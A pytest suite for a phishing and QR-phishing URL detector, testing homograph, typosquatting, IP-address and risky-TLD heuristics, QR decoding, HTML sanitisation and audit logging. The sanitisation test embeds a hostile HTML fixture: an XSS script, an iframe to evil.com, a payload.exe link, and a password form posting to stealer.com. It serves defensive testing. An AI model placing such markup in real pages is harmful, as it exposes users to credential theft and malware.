"""
PhishHunter Live - Suite de Pruebas Unitarias Automatizadas
=============================================================================
Alineado con:
- ISO/IEC 27001:2022 A.8.15 / A.8.20 / A.8.24
- OWASP ASVS v4.0 V5.1 (CWE-601, CWE-79)
- NIST SP 800-52 / 63B
- CIS Controls v8 4.1
"""

import os
import json
import tempfile
import pytest
from bs4 import BeautifulSoup

from core.heuristic_engine import HeuristicEngine
from core.qr_decoder import QRDecoder
from core.sandbox_preview import SandboxPreview
from database.db_manager import DatabaseManager
from utils.threat_signatures import (
    levenshtein_distance,
    calculate_similarity_ratio,
    extract_base_domain,
)


@pytest.fixture
def heuristic_engine():
    return HeuristicEngine()


@pytest.fixture
def temp_db():
    # Base de datos temporal para pruebas aisladas
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    db = DatabaseManager(db_path=path)
    yield db
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass


def test_levenshtein_distance_algorithm():
    """Valida la exactitud del cálculo de distancia de edición."""
    assert levenshtein_distance("paypal", "paypal") == 0
    assert levenshtein_distance("paypal", "paypa1") == 1
    assert levenshtein_distance("chase", "chasse") == 1
    assert levenshtein_distance("google", "microsoft") > 4

    ratio = calculate_similarity_ratio("paypal.com", "paypa1.com")
    assert ratio >= 0.88


def test_base_domain_extraction():
    """Valida la extracción de dominios base y ccTLDs compuestos."""
    assert extract_base_domain("www.google.com") == "google.com"
    assert extract_base_domain("sub.login.chase.com") == "chase.com"
    assert extract_base_domain("secure.hsbc.co.uk") == "hsbc.co.uk"
    assert extract_base_domain("portal.mercadolibre.com.mx") == "mercadolibre.com.mx"


def test_homograph_punycode_detection(heuristic_engine):
    """Verifica detección de dominios con prefijo Punycode (RFC 5890)."""
    # xn--pypal-4ve.com representa paypal con carácter confusable
    result = heuristic_engine.analyze("https://xn--pypal-4ve.com/login")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "HOMOGRAPH-RFC5890" in flags
    assert result["risk_score"] >= 45
    assert result["risk_level"] in ("SOSPECHOSO", "CRÍTICO / QUISHING")


def test_homograph_cyrillic_lookalike(heuristic_engine):
    """Verifica detección de caracteres cirílicos simulando letras latinas (MITRE T1566.002)."""
    # '\u0440' es la letra cirílica pequeña 'er' que se ve idéntica a 'p'
    cyrillic_paypal = "https://\u0440aypal.com/account"
    result = heuristic_engine.analyze(cyrillic_paypal)
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "HOMOGRAPH-RFC5890" in flags
    assert result["risk_score"] >= 45


def test_typosquatting_detection(heuristic_engine):
    """Verifica detección de Typosquatting contra marcas oficiales (NIST SP 800-63B)."""
    # paypa1.com vs paypal.com (distancia 1)
    result = heuristic_engine.analyze("https://paypa1.com/signin")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "TYPOSQUAT-NIST800-63B" in flags
    assert result["risk_score"] >= 40


def test_combosquatting_brand_embedding(heuristic_engine):
    """Verifica detección de marcas bancarias embebidas en dominios maliciosos."""
    result = heuristic_engine.analyze("https://chase-security-update.com/auth")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "TYPOSQUAT-NIST800-63B" in flags


def test_legitimate_domain_is_safe(heuristic_engine):
    """Verifica que un dominio legítimo con HTTPS no sea penalizado erróneamente."""
    result = heuristic_engine.analyze("https://www.paypal.com")
    # No debe tener banderas de homógrafo ni typosquatting
    flag_ids = [f["rule_id"] for f in result["flags_detected"]]
    assert "HOMOGRAPH-RFC5890" not in flag_ids
    assert "TYPOSQUAT-NIST800-63B" not in flag_ids
    assert result["risk_level"] == "SEGURO"
    assert result["risk_score"] < 30


def test_structural_direct_public_ip(heuristic_engine):
    """Verifica detección de URLs basadas en IP directa (CIS Controls v8 4.1)."""
    result = heuristic_engine.analyze("http://198.51.100.23/portal/login")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "STRUCT-DIRECT-IP" in flags
    assert "CRYPTO-CLEARTEXT-HTTP" in flags
    assert result["risk_score"] >= 70
    assert result["risk_level"] == "CRÍTICO / QUISHING"


def test_structural_risky_tld_and_keywords(heuristic_engine):
    """Verifica detección combinada de TLD de alto riesgo y señuelos de credenciales."""
    result = heuristic_engine.analyze("https://banco-soporte.xyz/verify-banking-account")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "STRUCT-RISKY-TLD" in flags
    assert "STRUCT-LURE-KEYWORDS" in flags
    assert result["risk_score"] >= 35


def test_anomalous_port_detection(heuristic_engine):
    """Verifica penalización por uso de puertos anómalos (ej: :8080, :4444)."""
    result = heuristic_engine.analyze("https://secure-node.org:8080/token")
    flags = [f["rule_id"] for f in result["flags_detected"]]

    assert "NET-ANOMALOUS-PORT" in flags
    assert any(f["penalty"] == 25 for f in result["flags_detected"])


def test_qr_generation_and_decoding():
    """Verifica el ciclo completo de visión computacional: generación y decodificación QR."""
    test_payload = "https://phishhunter-secure-test.org/auth"
    qr_img = QRDecoder.generate_qr_image(test_payload)

    decoder = QRDecoder()
    result = decoder.decode_from_cv2_image(qr_img)

    assert result["success"] is True
    assert result["data"] == test_payload
    assert result["annotated_image"] is not None


def test_sandbox_html_sanitization():
    """Verifica neutralización estricta de scripts, iframes y eventos JS (CWE-79)."""
    malicious_html = """
    <html>
      <head><title>Phish Portal</title></head>
      <body>
        <script>alert('XSS Exploit!');</script>
        <iframe src="evil.com"></iframe>
        <a href="https://evil.com/payload.exe" onclick="downloadMalware()">Haz clic aquí</a>
        <form action="http://stealer.com/post">
          <input type="text" name="password" />
          <button type="submit">Robar</button>
        </form>
      </body>
    </html>
    """
    soup = BeautifulSoup(malicious_html, "html.parser")
    sandbox = SandboxPreview()
    sanitized = sandbox._sanitize_html(soup)

    # Las etiquetas script e iframe deben haber sido eliminadas
    assert "<script" not in sanitized.lower()
    assert "<iframe" not in sanitized.lower()
    # Los eventos onclick deben haber sido eliminados
    assert "downloadmalware" not in sanitized.lower()
    # El enlace debe haber sido neutralizado
    assert "pointer-events: none" in sanitized
    assert "disabled" in sanitized


def test_database_persistence_and_metrics(temp_db):
    """Verifica inserción, consulta forense, cálculo de estadísticas y exportación CSV/JSON."""
    # Inserción de prueba
    sample_flags = [
        {"rule_id": "HOMOGRAPH-RFC5890", "name": "Homógrafo", "penalty": 45, "standard": "RFC 5890"}
    ]
    log_id = temp_db.insert_audit_log(
        qr_raw_data="https://paypa1.xyz/login",
        final_url="https://paypa1.xyz/login",
        redirect_count=1,
        risk_score=75,
        risk_level="CRÍTICO / QUISHING",
        detected_flags=sample_flags,
        client_ip="192.168.1.50"
    )

    assert log_id > 0

    # Consulta de logs
    logs = temp_db.get_all_audit_logs()
    assert len(logs) == 1
    assert logs[0]["final_url"] == "https://paypa1.xyz/login"
    assert logs[0]["risk_level"] == "CRÍTICO / QUISHING"
    assert len(logs[0]["detected_flags"]) == 1

    # Métricas del SOC
    stats = temp_db.get_audit_stats()
    assert stats["total_inspections"] == 1
    assert stats["critical_count"] == 1
    assert stats["average_score"] == 75.0

    # Exportación
    json_export = temp_db.export_to_json()
    assert "paypa1.xyz" in json_export

    csv_export = temp_db.export_to_csv()
    assert "paypa1.xyz" in csv_export
